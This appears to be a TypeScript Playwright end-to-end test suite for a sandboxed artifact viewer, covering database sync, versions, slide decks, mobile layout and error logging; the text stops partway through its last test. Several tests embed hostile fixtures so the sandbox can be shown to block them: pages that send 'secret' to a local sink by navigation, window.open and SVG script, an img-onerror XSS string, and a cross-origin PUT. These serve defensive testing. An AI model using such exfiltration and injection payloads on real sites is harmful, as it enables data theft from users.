import assert from 'node:assert/strict'
import { existsSync, mkdtempSync, readdirSync, rmSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { createServer, type Server } from 'node:http'
import { after, before, test } from 'node:test'
import { serve, type ServerType } from '@hono/node-server'
import { chromium, type Browser, type Page } from 'playwright-core'
import pptxgen from 'pptxgenjs'
import { createAppServer } from '../src/app-server.ts'
import { ArtifactStore } from '../src/artifact-store.ts'
import { createContentServer } from '../src/content-server.ts'
import { OwnerAuth } from '../src/owner-auth.ts'
import { createPublicAppServer, publicContentConfig } from '../src/public-server.ts'

const PptxGenJS = ((pptxgen as unknown as { default?: typeof pptxgen.default }).default ?? pptxgen) as typeof pptxgen.default

// Set CHROMIUM_PATH, or keep a Playwright headless shell in its default cache.
function findChromium(): string | undefined {
  if (process.env.CHROMIUM_PATH) return process.env.CHROMIUM_PATH
  // The newest headless shell in the cache, so a Playwright upgrade does not need this file edited.
  const cache = join(homedir(), 'Library/Caches/ms-playwright')
  const shells = existsSync(cache)
    ? readdirSync(cache).filter((name) => name.startsWith('chromium_headless_shell-')).sort((a, b) => Number(b.split('-')[1]) - Number(a.split('-')[1]))
    : []
  const candidates = [
    ...shells.map((name) => join(cache, name, 'chrome-headless-shell-mac-arm64/chrome-headless-shell')),
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser'
  ]
  return candidates.find((path) => existsSync(path))
}

const chromiumPath = findChromium()
const TOKEN = 'e2e-token-0123456789'
const APP_PORT = 18790
const CONTENT_PORT = 18791
const SINK_PORT = 18799
const PUBLIC_APP_PORT = 18792
const PUBLIC_CONTENT_PORT = 18793
let dir: string
let store: ArtifactStore
let auth: OwnerAuth
let servers: ServerType[] = []
let browser: Browser

const PAGE = `<!doctype html><html><head><title>Bridge</title></head><body>
<p id="count">?</p><p id="upload"></p><p id="leak">no</p>
<script>
const count = document.getElementById('count')
async function refresh() { const doc = await artifact.db.get('c', 'main'); count.textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
window.bump = async () => { const doc = await artifact.db.get('c', 'main'); await artifact.db.set('c', 'main', { n: (doc?.data?.n ?? 0) + 1 }) }
window.upload = async () => { const asset = await artifact.uploads.put(new Blob(['hi']), 'note.txt'); document.getElementById('upload').textContent = asset.url }
fetch('http://localhost:${APP_PORT}/api/artifacts').then(() => { document.getElementById('leak').textContent = 'yes' }, () => {})
</script></body></html>`

before(async () => {
  if (!chromiumPath) return
  dir = mkdtempSync(join(tmpdir(), 'artifacts-e2e-'))
  store = new ArtifactStore(dir)
  const config = {
    dataDir: dir,
    appPort: APP_PORT,
    contentPort: CONTENT_PORT,
    appOrigin: `http://localhost:${APP_PORT}`,
    contentOrigin: `http://127.0.0.1:${CONTENT_PORT}`,
    tokens: [TOKEN],
    public: { appPort: PUBLIC_APP_PORT, contentPort: PUBLIC_CONTENT_PORT, appOrigin: `http://localhost:${PUBLIC_APP_PORT}`, contentOrigin: `http://127.0.0.1:${PUBLIC_CONTENT_PORT}` }
  }
  auth = new OwnerAuth(dir, config.public.appOrigin)
  servers = [
    serve({ fetch: createAppServer(store, config, { auth }).fetch, port: APP_PORT, hostname: '127.0.0.1' }),
    serve({ fetch: createContentServer(store, config).fetch, port: CONTENT_PORT, hostname: '127.0.0.1' }),
    serve({ fetch: createPublicAppServer(store, config, auth).fetch, port: PUBLIC_APP_PORT, hostname: '127.0.0.1' }),
    serve({ fetch: createContentServer(store, publicContentConfig(config), { publicOnly: true, contentTokens: auth }).fetch, port: PUBLIC_CONTENT_PORT, hostname: '127.0.0.1' })
  ]
  browser = await chromium.launch({ executablePath: chromiumPath })
})

after(async () => {
  if (!chromiumPath) return
  await browser.close()
  for (const server of servers) server.close()
  store.close()
  auth.close()
  rmSync(dir, { recursive: true, force: true })
})

test('a sandboxed page reaches its capabilities only through the viewer, live across viewers', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Bridge', capabilities: ['db', 'uploads'], files: { 'index.html': { content: Buffer.from(PAGE) } } })
  const first = await browser.newPage()
  const second = await browser.newPage()
  await first.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await second.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frameOf = (page: typeof first) => page.frameLocator('#frame')

  await frameOf(first).locator('#count').filter({ hasText: '0' }).waitFor()
  await frameOf(second).locator('#count').filter({ hasText: '0' }).waitFor()
  const pageFrame = first.frames().find((frame) => frame.url().includes(`:${CONTENT_PORT}/`))
  assert.ok(pageFrame)
  assert.equal(await pageFrame.evaluate(() => origin), 'null')

  await pageFrame.evaluate(() => (window as unknown as { bump: () => Promise<void> }).bump())
  // The other viewer learns of the write over the event stream, not by polling.
  await frameOf(second).locator('#count').filter({ hasText: '1' }).waitFor({ timeout: 5000 })

  await pageFrame.evaluate(() => (window as unknown as { upload: () => Promise<void> }).upload())
  await frameOf(first).locator('#upload').filter({ hasText: `/a/${id}/assets/` }).waitFor()
  assert.equal(store.listAssets(id)[0]?.source, 'page')

  assert.equal(await frameOf(first).locator('#leak').textContent(), 'no')
})

async function listenSink(): Promise<{ hits: string[]; server: Server }> {
  const hits: string[] = []
  const server = createServer((req, res) => {
    hits.push(req.url ?? '')
    res.end('<!doctype html><title>sink</title><script>window.addEventListener("message", () => {})</script>')
  })
  await new Promise<void>((resolve) => server.listen(SINK_PORT, '127.0.0.1', resolve))
  return { hits, server }
}

const EXFIL_PAGES: Record<string, string> = {
  'location.href': `<script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script>`,
  'meta refresh': `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:${SINK_PORT}/leak?d=secret">`,
  'window.open': `<button id="go" onclick="window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret')">go</button><script>window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret'); document.getElementById('go').click()</script>`
}

for (const [name, body] of Object.entries(EXFIL_PAGES)) {
  test(`a sandboxed page cannot send data out by navigation (${name})`, { skip: !chromiumPath && 'no Chromium found' }, async () => {
    const sink = await listenSink()
    try {
      const { id } = store.publish({ title: 'Exfil', capabilities: ['db'], files: { 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body>${body}</body></html>`) } } })
      const context = await browser.newContext()
      const page = await context.newPage()
      await page.goto(`http://localhost:${APP_PORT}/a/${id}`)
      await page.waitForTimeout(1500)
      assert.deepEqual(sink.hits, [])
      assert.equal(context.pages().length, 1)
      assert.ok(page.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
      await context.close()
    } finally {
      sink.server.close()
    }
  })
}

test('an artifact page cannot load another artifact\'s files', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const other = store.publish({ title: 'Other', files: { 'index.html': { content: Buffer.from('x') }, 'data.js': { content: Buffer.from("window.STOLEN = 'yes'") } } })
  const page = `<!doctype html><html><head></head><body><p id="seen">no</p>
<script src="http://127.0.0.1:${CONTENT_PORT}/a/${other.id}/v/1/data.js"></script>
<script>document.getElementById('seen').textContent = typeof window.STOLEN === 'undefined' ? 'no' : 'yes'</script></body></html>`
  const { id } = store.publish({ title: 'Mine', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#seen').waitFor()
  assert.equal(await viewer.frameLocator('#frame').locator('#seen').textContent(), 'no')
  await viewer.close()
})

test('a rendered page opened top-level on the content origin is sent back into the viewer, not left free to navigate out', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const sink = await listenSink()
  try {
    const page = `<!doctype html><html><head></head><body><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=' + encodeURIComponent(document.title)</script></body></html>`
    const { id } = store.publish({ title: 'Direct', files: { 'index.html': { content: Buffer.from(page) } } })
    const context = await browser.newContext()
    const tab = await context.newPage()
    await tab.goto(`http://127.0.0.1:${CONTENT_PORT}/a/${id}/v/1/`)
    await tab.waitForTimeout(1500)
    // The viewer drops ?v= for the latest version.
    assert.equal(tab.url(), `http://localhost:${APP_PORT}/a/${id}`)
    assert.ok(tab.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
    assert.deepEqual(sink.hits, [])
    await context.close()
  } finally {
    sink.server.close()
  }
})

test('links between pages of one artifact navigate inside the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({
    title: 'Multi',
    files: {
      'index.html': { content: Buffer.from('<!doctype html><html><head></head><body><a id="next" href="other.html">next</a></body></html>') },
      'other.html': { content: Buffer.from('<!doctype html><html><head></head><body><p id="here">other page</p></body></html>') }
    }
  })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#next').click()
  await viewer.frameLocator('#frame').locator('#here').waitFor()
  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/other.html')))
  // The address bar follows the reader, so 複製連結 and a reload land on the page they are reading.
  await viewer.waitForURL(`http://localhost:${APP_PORT}/a/${id}?path=other.html`)
  await viewer.close()
})

test('a new version keeps the reader on the same file and scroll position', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const tall = (marker: string) => `<!doctype html><html><head></head><body><p id="here">${marker}</p><div style="height:5000px"></div></body></html>`
  const { id } = store.publish({
    title: 'Keep place',
    files: {
      'index.html': { content: Buffer.from('<!doctype html><html><head></head><body><a id="next" href="guide/other.html">next</a></body></html>') },
      'guide/other.html': { content: Buffer.from(tall('v1')) }
    }
  })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1000, height: 700 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('#next').click()
  await frame.locator('#here').filter({ hasText: 'v1' }).waitFor()
  const pageFrame = () => viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  await pageFrame().evaluate(() => scrollTo(0, 1200))
  await viewer.waitForTimeout(500)

  store.update(id, { files: { 'guide/other.html': { content: Buffer.from(tall('v2')) } } })
  await frame.locator('#here').filter({ hasText: 'v2' }).waitFor({ timeout: 5000 })
  assert.ok(pageFrame().url().endsWith('/v/2/guide/other.html'), pageFrame().url())
  await pageFrame().waitForFunction(() => Math.abs(scrollY - 1200) < 5, undefined, { timeout: 5000 })

  // A version without that file falls back to the entry instead of a 404.
  store.update(id, { files: { 'guide/other.html': null } })
  await frame.locator('#next').waitFor({ timeout: 5000 })
  assert.ok(pageFrame().url().includes('/v/3/'), pageFrame().url())
  await viewer.close()
})

test('a viewer that lost its event stream catches up on reconnect without reloading the page', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = `<!doctype html><html><head></head><body><input id="draft"><p id="value">?</p>
<script>
async function refresh() { const doc = await artifact.db.get('c', 'main'); document.getElementById('value').textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
</script></body></html>`
  const { id } = store.publish({ title: 'Resync', capabilities: ['db'], files: { 'index.html': { content: Buffer.from(page) } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('#value').filter({ hasText: '0' }).waitFor()
  await frame.locator('#draft').fill('typed before the drop')

  // Offline emulation alone leaves the open stream half-alive; dropping the sockets is what a sleeping phone looks like to the server.
  await context.setOffline(true)
  const appServer = servers[0]
  if ('closeAllConnections' in appServer) appServer.closeAllConnections()
  store.setDoc(id, 'c', 'main', { n: 7 }, false)
  await viewer.waitForTimeout(1000)
  await context.setOffline(false)

  await frame.locator('#value').filter({ hasText: '7' }).waitFor({ timeout: 8000 })
  assert.equal(await frame.locator('#draft').inputValue(), 'typed before the drop')
  await context.close()
})

test('the viewer bar fits phone widths without horizontal scroll and leaves the title room', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const title = '季度營運回顧與下一季的重點工作清單'
  const { id } = store.publish({ title, icon: '📊', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi</p>') } } })
  // A second version shows the ± button, the widest the bar gets without page errors.
  store.update(id, { files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi 2</p>') } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  for (const width of [320, 375, 414, 1280]) {
    await viewer.setViewportSize({ width, height: 700 })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.locator('#changes').waitFor()
    const metrics = await viewer.evaluate(() => {
      const el = document.getElementById('title')!
      return { scroll: document.documentElement.scrollWidth, inner: innerWidth, titleWidth: el.getBoundingClientRect().width, clipped: el.scrollWidth > el.clientWidth }
    })
    assert.ok(metrics.scroll <= metrics.inner, `${width}px overflows: ${metrics.scroll} > ${metrics.inner}`)
    if (width <= 414) assert.ok(metrics.titleWidth >= 220, `${width}px title only ${metrics.titleWidth}px wide`)
    if (width >= 375) assert.equal(metrics.clipped, false, `${width}px title is cut off`)
  }
  await context.close()
})

const SVG_EXFIL = `<svg xmlns="http://www.w3.org/2000/svg"><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script><rect width="10" height="10"/></svg>`

test('an SVG opened top-level on the content origin cannot navigate out, as a version file or as an asset', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const sink = await listenSink()
  try {
    const { id } = store.publish({ title: 'Svg', files: { 'index.html': { content: Buffer.from('<p>x</p>') }, 'x.svg': { content: Buffer.from(SVG_EXFIL) } } })
    const asset = store.addAsset(id, 'x.svg', Buffer.from(SVG_EXFIL), 'publisher')
    const context = await browser.newContext()
    for (const path of [`/a/${id}/v/1/x.svg`, `/a/${id}/assets/${asset.id}/x.svg`]) {
      const tab = await context.newPage()
      await tab.goto(`http://127.0.0.1:${CONTENT_PORT}${path}`)
      await tab.waitForTimeout(1000)
      assert.equal(tab.url(), `http://127.0.0.1:${CONTENT_PORT}${path}`)
      assert.deepEqual(sink.hits, [], path)
      await tab.close()
    }
    await context.close()
  } finally {
    sink.server.close()
  }
})

test('an SVG still renders as an image and in the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="red"/></svg>'
  const page = '<!doctype html><html><head></head><body><img id="pic" src="x.svg"></body></html>'
  const { id } = store.publish({ title: 'Img', files: { 'index.html': { content: Buffer.from(page) }, 'x.svg': { content: Buffer.from(svg) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const pic = viewer.frameLocator('#frame').locator('#pic')
  await pic.waitFor()
  await viewer.waitForFunction(() => (document.getElementById('frame') as HTMLIFrameElement).contentWindow !== null)
  assert.equal(await pic.evaluate((el) => (el as HTMLImageElement).naturalWidth), 10)
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?path=x.svg`)
  await viewer.waitForTimeout(500)
  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/x.svg')))
  await viewer.close()
})

test('the phone viewer fits the viewport and its comments panel can always be closed', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: '手機留言', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi</p>') } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  for (const [width, height] of [[375, 700], [320, 640]]) {
    await viewer.setViewportSize({ width, height })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.locator('#title').waitFor({ state: 'attached' })
    const size = () => viewer.evaluate(() => ({ sh: document.documentElement.scrollHeight, ih: innerHeight, sw: document.documentElement.scrollWidth, iw: innerWidth }))
    const fits = async (when: string) => {
      const m = await size()
      assert.ok(m.sh <= m.ih, `${width}px ${when}: page ${m.sh} taller than viewport ${m.ih}`)
      assert.ok(m.sw <= m.iw, `${width}px ${when}: page ${m.sw} wider than viewport ${m.iw}`)
    }
    await fits('closed')
    const panel = viewer.locator('#comments')
    await viewer.locator('#toggle-comments').click()
    await panel.waitFor({ state: 'visible' })
    await fits('open')
    await viewer.locator('#toggle-comments').click({ timeout: 3000 })
    await panel.waitFor({ state: 'hidden' })
    await viewer.locator('#toggle-comments').click()
    await panel.waitFor({ state: 'visible' })
    await viewer.locator('#close-comments').click({ timeout: 3000 })
    await panel.waitFor({ state: 'hidden' })
    assert.equal(await viewer.locator('#toggle-comments').getAttribute('aria-expanded'), 'false')
  }
  await context.close()
})

test('a viewer on an older version still re-reads db after a reconnect when a newer version appeared meanwhile', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = `<!doctype html><html><head></head><body><p id="value">?</p>
<script>
async function refresh() { const doc = await artifact.db.get('c', 'main'); document.getElementById('value').textContent = String(doc?.data?.n ?? 0) }
artifact.db.subscribe(refresh)
refresh()
</script></body></html>`
  const files = { 'index.html': { content: Buffer.from(page) } }
  const { id } = store.publish({ title: 'Old', capabilities: ['db'], files })
  store.update(id, { files: { 'index.html': { content: Buffer.from(page + '<!--2-->') } } })
  const context = await browser.newContext()
  const viewer = await context.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?v=1`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('#value').filter({ hasText: '0' }).waitFor()

  await context.setOffline(true)
  const appServer = servers[0]
  if ('closeAllConnections' in appServer) appServer.closeAllConnections()
  store.setDoc(id, 'c', 'main', { n: 9 }, false)
  store.update(id, { files: { 'index.html': { content: Buffer.from(page + '<!--3-->') } } })
  await viewer.waitForTimeout(1000)
  await context.setOffline(false)

  await frame.locator('#value').filter({ hasText: '9' }).waitFor({ timeout: 8000 })
  assert.match(viewer.url(), /v=1/)
  await context.close()
})

test('errors a page hits reach the error log and the viewer badge', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = `<!doctype html><html><head></head><body><img src="missing.png">
<script>fetch('https://example.invalid/x').catch(() => {}); setTimeout(() => { throw new Error('boom from page') })</script></body></html>`
  const { id } = store.publish({ title: 'Errors', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const badge = viewer.locator('#errors')
  await badge.filter({ hasText: '3' }).waitFor({ timeout: 5000 })
  const kinds = store.listErrors(id, 1).map((e) => `${e.kind}:${e.path}`).sort()
  assert.deepEqual(kinds, ['csp:index.html', 'error:index.html', 'resource:index.html'])
  assert.match(store.listErrors(id, 1).find((e) => e.kind === 'csp')?.message ?? '', /connect-src/)
  assert.match(store.listErrors(id, 1).find((e) => e.kind === 'error')?.source ?? '', /^index\.html:\d+:\d+$/)
  await badge.click()
  await viewer.locator('#error-list').filter({ hasText: 'boom from page' }).waitFor()

  // A clean page shows no badge.
  const clean = store.publish({ title: 'Clean', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p id="ok">ok</p>') } } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${clean.id}`)
  await viewer.frameLocator('#frame').locator('#ok').waitFor()
  await viewer.waitForTimeout(500)
  assert.equal(await badge.isVisible(), false)
  await viewer.close()
})

test('markdown shows mermaid diagrams in the sandbox and its table of contents jumps within the page', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = `# 圖\n\n## 第一節\n\n\`\`\`mermaid\nflowchart LR\n  A[寫檔] --> B[發布]\n\`\`\`\n\n## 第二節\n\n${'段落\n\n'.repeat(200)}## 第三節\n\n結尾\n`
  const { id } = store.publish({ title: 'Mermaid', files: { 'index.md': { content: Buffer.from(md) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1280, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('figure.diagram svg').waitFor({ timeout: 10000 })
  assert.match(await frame.locator('figure.diagram svg').innerHTML(), /寫檔/)
  await frame.locator('nav.toc a[href="#第三節"]').click()
  const pageFrame = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  await pageFrame.waitForFunction(() => scrollY > 1000)
  assert.equal(await pageFrame.evaluate(() => decodeURIComponent(location.hash)), '#第三節')
  assert.deepEqual(store.listErrors(id, 1), [])
  await viewer.close()
})

test('a page cannot load other files from the shared /_/ path', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = '<!doctype html><html><head></head><body><p id="r">?</p><script src="/_/markdown.css" onerror="document.getElementById(\'r\').textContent = \'blocked\'" onload="document.getElementById(\'r\').textContent = \'loaded\'"></script></body></html>'
  const { id } = store.publish({ title: 'Shared', files: { 'index.html': { content: Buffer.from(page) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('#r').filter({ hasText: 'blocked' }).waitFor({ timeout: 5000 })
  await viewer.close()
})

test('a viewer on a version that gets pruned moves to the current one', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const page = (n: number) => ({ 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body><p id="n">v${n}</p></body></html>`) } })
  const { id } = store.publish({ title: 'Prune', files: page(1) })
  store.update(id, { files: page(2) })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?v=1`)
  await viewer.frameLocator('#frame').locator('#n').filter({ hasText: 'v1' }).waitFor()
  store.prune(id, 1)
  await viewer.frameLocator('#frame').locator('#n').filter({ hasText: 'v2' }).waitFor({ timeout: 5000 })
  assert.deepEqual(await viewer.locator('#version option').allTextContents(), ['v2 · 最新'])
  await viewer.close()
})

test('gallery search finds page text and shows the hit as text, never markup', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = '# 搜尋\n\n倉庫驗貨 &lt;img src=x onerror="document.title=\'pwned\'"&gt; 流程\n'
  store.publish({ title: 'Search', files: { 'index.md': { content: Buffer.from(md) } } })
  const gallery = await browser.newPage()
  await gallery.goto(`http://localhost:${APP_PORT}/`)
  await gallery.locator('#search').fill('驗貨')
  const snippet = gallery.locator('.card-snippet').filter({ hasText: '倉庫驗貨' })
  await snippet.waitFor({ timeout: 5000 })
  assert.equal(await snippet.locator('mark').textContent(), '驗貨')
  assert.equal(await snippet.locator('img').count(), 0)
  assert.notEqual(await gallery.title(), 'pwned')
  await gallery.close()
})

test('a reader sees what a new version changed, from the update notice or the ± button', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const md = (end: string) => `# 版本\n\n${Array.from({ length: 12 }, (_, i) => `第 ${i} 段`).join('\n\n')}\n\n${end}\n`
  const { id } = store.publish({ title: 'Diff', files: { 'index.md': { content: Buffer.from(md('舊結論')) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 375, height: 700 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.frameLocator('#frame').locator('h1').waitFor()
  assert.equal(await viewer.locator('#changes').isVisible(), false)
  store.update(id, { label: '改結論', files: { 'index.md': { content: Buffer.from(md('<新結論>')) } } })
  await viewer.locator('#toast-action').filter({ hasText: '看變更' }).click({ timeout: 5000 })
  const dialog = viewer.locator('#diff-dialog')
  await dialog.locator('.diff-lines .add').filter({ hasText: '+ <新結論>' }).waitFor()
  assert.equal(await dialog.locator('.diff-lines .del').textContent(), '- 舊結論')
  assert.match(await viewer.locator('#diff-meta').textContent() ?? '', /改結論/)
  const width = await viewer.evaluate(() => document.documentElement.scrollWidth)
  assert.ok(width <= 375, `dialog overflows: ${width}`)
  await viewer.locator('#close-diff').click()
  await viewer.locator('#changes').click()
  await dialog.waitFor({ state: 'visible' })
  await viewer.close()
})

const DECK = ['# Deck', 'by me', '???', 'opening words', '---', '## Two', '- a', '---', '## Three', 'text'].join('\n')

test('a slide deck turns pages from keys in or outside the frame, and a new version opens on the same slide', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1200, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active#slide-1').waitFor()
  // The viewer has focus, not the frame: it forwards the arrow key.
  await viewer.keyboard.press('ArrowRight')
  await frame.locator('.slide.active#slide-2').waitFor()
  assert.equal(await frame.locator('#deck-counter').textContent(), '2 / 3')
  await viewer.waitForFunction(() => location.hash === '#2')
  await frame.locator('[data-deck="notes"]').click()
  await frame.locator('[data-deck="prev"]').click()
  assert.equal(await frame.locator('#deck-notes').textContent(), 'opening words\n')
  await frame.locator('[data-deck="next"]').click()
  await frame.locator('[data-deck="next"]').click()
  await frame.locator('.slide.active#slide-3').waitFor()

  store.update(id, { files: { 'index.slides.md': { content: Buffer.from(DECK.replace('text', 'changed')) } } })
  await frame.locator('.slide.active#slide-3', { hasText: 'changed' }).waitFor({ timeout: 5000 })

  // The overview shows every slide; picking one goes there.
  await frame.locator('[data-deck="overview"]').click()
  await frame.locator('#slide-1').click()
  await frame.locator('body:not(.overview) .slide.active#slide-1').waitFor()
  await viewer.close()

  // A link to slide 2 opens on slide 2.
  const linked = await browser.newPage()
  await linked.goto(`http://localhost:${APP_PORT}/a/${id}#2`)
  await linked.frameLocator('#frame').locator('.slide.active#slide-2').waitFor()
  await linked.close()
})

test('a slide that cannot fit even with smaller text is reported to the error log', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const long = Array.from({ length: 60 }, (_, i) => `- item ${i}`).join('\n')
  const { id } = store.publish({ title: 'Overflow', files: { 'index.slides.md': { content: Buffer.from(`## Fine\n---\n## Too much\n${long}`) } } })
  const viewer = await browser.newPage()
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  await viewer.locator('#errors:not([hidden])').waitFor({ timeout: 5000 })
  const errors = store.listErrors(id, 1)
  assert.equal(errors.length, 1)
  assert.match(errors[0].message, /第 2 頁內容太多/)
  await viewer.close()
})

test('a deck fits a phone: one slide in view, controls without horizontal scroll', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Phone deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage({ viewport: { width: 375, height: 740 }, hasTouch: true })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  const page = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  const fit = await page.evaluate(() => {
    const slide = document.querySelector('.slide.active')!.getBoundingClientRect()
    const bar = document.querySelector('.deck-bar')!
    return { slideWidth: slide.width, innerWidth, barOverflow: bar.scrollWidth > bar.clientWidth, docOverflow: document.documentElement.scrollWidth > innerWidth }
  })
  assert.ok(fit.slideWidth <= fit.innerWidth && fit.slideWidth > fit.innerWidth * 0.8, JSON.stringify(fit))
  assert.equal(fit.barOverflow, false)
  assert.equal(fit.docOverflow, false)
  await viewer.close()
})

test('the deck editor previews a draft live, saves it as a version, and stays on the slide', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Edit deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage()
  await viewer.setViewportSize({ width: 1300, height: 800 })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  await viewer.click('#edit')
  const source = viewer.locator('#editor-source')
  await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('## Three'))
  // Typing on slide three's source shows slide three with the draft, before anything is saved.
  await source.evaluate((el: HTMLTextAreaElement) => {
    el.focus()
    el.setSelectionRange(el.value.length, el.value.length)
  })
  await viewer.keyboard.type(' draft-words')
  await frame.locator('.slide.active#slide-3', { hasText: 'draft-words' }).waitFor({ timeout: 5000 })
  assert.equal(store.requireSummary(id).currentVersion, 1)

  await viewer.keyboard.press('ControlOrMeta+s')
  await viewer.locator('#editor-status', { hasText: '已存成 v2' }).waitFor({ timeout: 5000 })
  assert.match(store.blobs.read(store.requireVersion(id, 2).files['index.slides.md'].sha256).toString(), /text draft-words$/)
  await viewer.waitForFunction(() => document.querySelector<HTMLIFrameElement>('#frame')!.src.includes('/v/2/'))
  await frame.locator('.slide.active#slide-3', { hasText: 'draft-words' }).waitFor({ timeout: 5000 })

  // Someone else saves while this viewer has an unsaved draft: the draft stays, saving reports the conflict.
  await viewer.keyboard.type(' mine')
  store.update(id, { files: { 'index.slides.md': { content: Buffer.from(DECK + '\n---\n## Theirs') } } })
  await viewer.locator('#toast', { hasText: '還沒儲存' }).waitFor({ timeout: 5000 })
  assert.match(await source.inputValue(), /draft-words mine$/)
  viewer.once('dialog', (dialog) => dialog.dismiss())
  await viewer.click('#save-deck')
  await viewer.locator('#editor-status', { hasText: '別人已存了新版本' }).waitFor({ timeout: 5000 })
  assert.equal(store.requireSummary(id).currentVersion, 3)
  await viewer.close()
})

test('no other origin can save a deck through the viewer route', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Guarded deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const page = await browser.newPage()
  await page.goto(`http://127.0.0.1:${CONTENT_PORT}/healthz`)
  const outcome = await page.evaluate(async (url) => {
    try {
      const response = await fetch(url, {
        method: 'PUT',
        headers: { 'content-type': 'application/json', 'x-artifact-client': 'viewer' },
        body: JSON.stringify({ markdown: '# pwned', baseVersion: 1 })
      })
      return `status ${response.status}`
    } catch (error) {
      return `blocked: ${(error as Error).name}`
    }
